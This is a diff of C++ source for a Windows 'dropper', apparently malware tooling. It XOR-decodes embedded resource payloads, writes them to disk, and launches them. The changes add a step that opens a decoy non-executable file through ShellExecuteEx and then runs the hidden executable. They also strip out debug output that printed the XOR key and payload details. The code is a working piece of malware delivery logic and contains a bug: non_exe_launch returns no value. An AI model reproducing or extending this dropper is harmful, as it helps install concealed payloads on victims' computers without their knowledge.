@@ -54,7 +54,8 @@ void w11_dropper_start();
 void drop(DWORD size, void* buffer, std::string);
 void* XOR(void* data, DWORD size);
 void* base64decode(void* data, DWORD* size);
-void launch(std::string);
+bool non_exe_launch(std::string);
+void exe_launch(std::string);
 void set_name(std::uint64_t);
 void setup_name(std::uint64_t);
 
@@ -125,7 +126,7 @@ int main(int argc, char* argv[])
 
 /////////////////////////////////////////////////////
 
-	 //Windows 7 version of Dropper
+	 //Windows 7 extract version of Dropper
 
 /////////////////////////////////////////////////////
 
@@ -140,22 +141,25 @@ int main(int argc, char* argv[])
 	#endif
 
 	#if DROPPER_XOR_KEY != 0
-		std::cout << std::hex << DROPPER_XOR_KEY << std::endl;
 		data2 = XOR(data2, size2);
 		data3 = XOR(data3, size3);
 	#endif
 
-		drop(data2, size2, name2);
+		drop(size2, data2, name2);
 
-		drop(data3, size3, name3);
+		drop(size3, data3, name3);
 
-		launch(name2);
+		bool result = non_exe_launch(name3);
 
-		launch(name3);
+		if (result == true){
+			exe_launch(name2);
+		} else {
+			std::cout << "This failed and nothing happened.\n";
+		}
 
 ////////////////////////////////////////////
 
-//             Windows 7 extract
+//             Windows 7 regular version of dropper
 
 ////////////////////////////////////////////
 
@@ -172,12 +176,9 @@ int main(int argc, char* argv[])
 		data4 = XOR(data4, size4);
 	#endif
 
-		std::cout << "This is name: " << name4 << "\n";
-		printf("This is data4: %p\n", data4);
-		printf("This is size: %llu\n", (unsigned long long) size4);
-		drop(data4, size4, name4);
+		drop(size4, data4, name4);
 
-		launch(name4);
+		exe_launch(name4);
 
 #endif
 
@@ -210,7 +211,8 @@ int main(int argc, char* argv[])
 
 		drop(size1, data1, name1);
 
-		launch(name1);
+		exe_launch(name1);
+
 #ifdef DEAD_CODE
 		// dead code
 		dead();
@@ -407,8 +409,21 @@ void w11_dropper_start(){
 	size1 = SizeofResource(h, r1);
 }
 
+bool non_exe_launch(std::string name){
+	SHELLEXECUTEINFO sei = {sizeof(sei)};
+	sei.fMask = SEE_MASK_NOCLOSEPROCESS;
+	sei.lpFile = name.c_str();
+	sei.nShow = SW_SHOWNORMAL;
+
+	BOOL result = ShellExecuteEx(&sei);
+	if ( result == TRUE ){
+		WaitForSingleObject(sei.hProcess, INFINITE);
+		CloseHandle(sei.hProcess);
+	}
+}
+
 // Launch a New Process based on the dropped file name
-void launch(std::string run_exe)
+void exe_launch(std::string run_exe)
 {
 	STARTUPINFOA si;
 	PROCESS_INFORMATION pi;
